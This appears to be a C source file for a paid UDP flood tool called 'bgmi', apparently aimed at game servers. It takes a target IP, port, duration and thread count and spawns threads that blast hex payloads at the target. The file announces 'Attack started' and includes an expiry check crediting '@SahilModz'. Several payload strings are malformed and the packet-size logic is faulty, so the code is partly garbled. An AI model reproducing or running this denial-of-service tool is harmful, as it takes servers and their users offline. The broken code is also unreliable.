#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define EXPIRY_DATE "2025-10-01" // Set the expiration date (YYYY-MM-DD format)

void usage() {
    printf("Usage: ./bgmi ip port time threads\n");
    exit(1);
}

// Function to check if the file has expired
int check_expiry() {
    struct tm expiry_time = {0};
    time_t current_time, expiry_timestamp;

    // Parse the expiration date
    if (strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_time) == NULL) {
        fprintf(stderr, "Error parsing expiration date\n");
        return 1;
    }

    // Convert expiration time to timestamp
    expiry_timestamp = mktime(&expiry_time);

    // Get the current time
    time(&current_time);

    // Compare current time with the expiry date
    if (difftime(expiry_timestamp, current_time) <= 0) {
        printf("THIS IS A PAID FILE BY @SAHILMODZOWNER EXPIRED ON %s.\n", EXPIRY_DATE);
        return 1;
    }

    return 0;  // Not expired
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;

    char *payloads[] = {
       "\x02\x21\x33\xE3\x60\xCA\x76\xE3\x6E\x82\xAE\xA7\x29\xDB\x9E\x6D\x37\x0F\xA1\x78\x82\x48\x35\xC0\x4C\x12\x89\xD9\x98\xEB\xCE\x14\x37\x21\xBD\xD0\x1A\x2A\xD4\x7D\xDD\x45\xA2\xF8\xC1\x5E\x51\x8A\x19\x2F\x0C\x94\xED\xEF\x0B\x32\x8C\x7B\x9F\xA4\x16\xE3\x32\x6B\x80\xC1\x13\x8D\x1D\x39\xC5\xCC\x4D\x10\x79\x31\xEC\xAD\x42\xAF\xAE\x6C\xAF\xEE\x36\x78\xDA\x24\xEE\xEF\x80\x71\x57\x8F\xD3\x9F\x77\x7E\xB9\x6E\xD0\x0E\x54\xAD\xFC\xD4\x06\x48\x03\xC9\x76\xEB\xEA\xA7\x41\x02\xAB\x82\xC6\xAF\x33\x4E\xC0\xCF\x3D\x6A\xF8\xB2\xB9\x3B\x44\x03\x22\xF5\x56\x03\x56\x88\xE3\xFC\x11\x60\x3E\x62\x56\x0A\x8D\x7C\x5D\xD7\x0A\xDA\x9A\xD3\xE5\xD0\xA8\xC1\x09\xD1\xB2\x02\xC0\xA2\xA6\x50\xD1\x95\xA5\x8D\xFB\xAC\xE1\xA5\xCB\x98\x5E\x55\x23\x29\xD9\x9C\xC3\x90\xF4\x34\x58\x32\xBA\xF5\xDB\x78\x25\xF5\xAB\x5F\xBB\xFC\xBC\xC0\xE8\xD1\x3A\x83\x00\x5F\x72\x24\x4B\x58\xBD\xFC\xBD\xDD\xFF\x06\x3C\x90\x6B\x7A\x06\xD1\x62\xFE\x47\x21\x60\x1E\xDA\xF7\x1C\xC3\x57\x7E\x93\x58\x30\x9F\xEF\x4C\x9A\xFD\x5F\xEE\x26\xC8\xB8\x28\xBF\x62\xB3\xF2\x68\x0E\x89\xBD\x8B\x19\xD2\x86\xB5\x5C\x70\xC5\xCA\xDD\x4A\xAA\xB8\x4E\x8E\xB1\x88\xEB\x3D\xF3\x0F\x5B\x36\xB6\xEB\x8F\x4C\x8F\xE7\x2A\xE4\xA2\x92\xEE\x58\x13\x90\xA5\x7F\xB4\xCA\x5E\xE6\x88\xFE\xA6\xB0\x74\xAD\x62\xAA\xE2\xE3\xD2\xF2\x0B\xAE\x93\x2E\xA3\x23\xBA\xC9\xEB\xC6\x70\x7F\xC1\xFC\x7E\x5C\x06\xC6\xC0\xA1\xF4\x75\xD1\xBC\x58\x7F\x32\xEE\xB7\x73\xD4\xD0\x74\xA3\x50\xF8\x60\x51\x5D\xC3\x7E\x7B\x33\xA0\x3C\x75\x23\xE7\x38\x51\xE6\x14\x4F\x73\x94\xF9\x79\x67\xD9\x3D\x04\x1B\xB0\x66\xCF\xDB\x89\x89\x22\xD3\x41\xAC\x8C\x89\x14\xD8\x41\x15\x56\xC1\x11\xCC\x1F\x67\x32\x53\x90\x16\x2B\xA0\xAB\x81\x4F\x6C\x35\xDD\x10\x51\xD0\x35\x42\xEE\x19\x6C\xB9\x6E\x31\xA2\xE6\x74\x6E\x4B\xCB\x92\x5A\x43\x8C\x4F"
 
 "x92\x4E\xE3\x8C\x54\xF6\x0B\x09\x78\xD4\xE8\x67\xB8\x9D\x3B\xB1\xF9\xF2x18\x89\x92\x88\x67\xA3\xC5\x50\xAE\xF1\xF1\xA6\x25\x57\x30\x01\xE2\xCA1F\x71\xD5\xC1\x74\x70\x37\x02\x08\x18\x05\xAD\x36\x8C\xD5\xC4\x56\x20\E6\x61\xCC\x3E\x22\x14\xA3\x7C\x9B\x94\xBF\x07\x1D\x16\xAF\x87\x2B\xCF\14\xC8\x05\xFB\xC6\x78\xA9\xAD\x6C\xBA\xD0\x6D\x79\xC8\xB9\x4C\xD0\x07x0D\xDA\xF2\x4D\x6C\xE9\x7E\x56\x90\xA9\x08\xC6\xF3\xF5\x41\xBD\xC3\x8\x58\x2D\x4A\xC3\xC1\xF6\xC1\x37\x9C\x41\xAB\x36\xD1\xCB\x08\x36\x28\xA\x18\x16\xB2\x66\x4C\x0C\x7E\x01\x22\x0E\xD5\x0D\xAE\x53\xE9\xD9\x9B\xC\x15\xC0\xAB\x8C\xA6\xBE\x1F\xAD\x92\x17\x94\x9B\xFF\x38\x23\xF3\x93\x9\xB0\x05\xBE\xBA\x45\x75\xA2\x5E\x65\x0B\xDF\xB1\x81\x54\x18\xEE\x9B\x3\x14\x0C\x0E\x9B\x57\xC3\xA6\xAC\x2B\x30\x6B\x75\xB9\x76\x33\x36\x06\xE\x42\x97\xDC\x5D\x26"

"x9E\x82\x26\x0A\xCD\x7F\x4B\x6F\xCF\xB7\x7F\xB9\x7B\x16\x9D\x86\x30\x8C\x02\xE0\x19\x73\xC1\xD2\x6A\xC2\x30\x1B\xCA\x2F\x64\x62\x03\x1C\x61\x49\x0D\xA6\x38\x94\x43\xF5\x11\xD0\x06\x49\x38\x08\x46\x60\x45\xB0\x37\x32\xB8\x5C\xE6\x58\xD0\x3F\xFC\x3B\xF0\x72\x1C\x31\x7D\x5B\x1C\xBA\x45\x5B\x01\x33\x62\x10\x93\xED\xB2\x4E\xF6\xEF\x39\x6B\x9D\x05\x36\xE0\xEF\x43\x77\x6A\x9C\xD7\x6A\x89\x9F\xC0\xFB"

"\x65\xB7\xCD\x44\x1A\xB3\xEA\x19\x97\x81\x00\x69\xDC\xFF\x68\xCB\xD6\x29\xF8\x23\x74\x51\x21\xAD\x85\x96\x7C\x56\x27\x0A\xED\xC9\x73\xC4\xB7\x23\x92\x25\x33\x96\xFD\x61\xF5\xC9\x35\x65\xB0\x1B\x63\xF6\x6A\x39\xD8\x7E\x71\x5C\xF5\x87\x6E\xEE\xB7\xDE\x9E\x07\xFD\x52\x5C\x8D\x31\xDF\x53\xFD\xA3\xB8\xE2\x02\xB0\x3D\x7B\x67\xBE\x34\x62\x22\x85\x2F\xAE\xEF\x89\xC6\x9D\x23\x5A\x40\xF8\xE0\xFA\xEE\x15\xBC\xD0\x56\x11\x38\xA1\x6B\xE2\x63\x4C\xBF\xC5\x78\x14\x4A\x25\xC7\x77\x76\x6E\x90\x83\x77\xF5\x5D\x66\x59\xD9\xEF\xEF\xAA\x7C\xEE\xC1\x5C\xBB\x3B\x18\xCE\x72\xA5\x35\x18\x39\xE5\xC2\x74\x29\x15\x70\x6C\xF1\x91\x86\x15\x3D\xCC\xF9\xE3\x71\x9E\xBE\x60\x4C\x99\x7F\x1D\x80\x7F\xC2\x0D\x62\x4E\x40\x9D\x4D\x57\xC0\xB0\x51\x5C\xF5\xD9\xBF\x01\xD1\x22\x4F\x68\x9C\xA4\xBA\x6B\x01\x70\xD3\x55\x47\x5A\x6F\x1F\xB7\x5E\xD0\x1E\xAA\x59\x2B\x3F"

        };

    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Send packets for the specified duration
    time_t endtime = time(NULL) + data->time;
    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], sizeof(payloads[i]), 0,
                      (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Check if the file has expired
    if (check_expiry()) {
        exit(1);
    }

    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    // Start attack threads
    for (int i = 0; i < threads; i++) {
        struct thread_data *thread_data_copy = malloc(sizeof(struct thread_data));
        memcpy(thread_data_copy, &data, sizeof(struct thread_data));

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)thread_data_copy) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    // Join all attack threads
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished, join @SahilModz\n");
    return 0;
}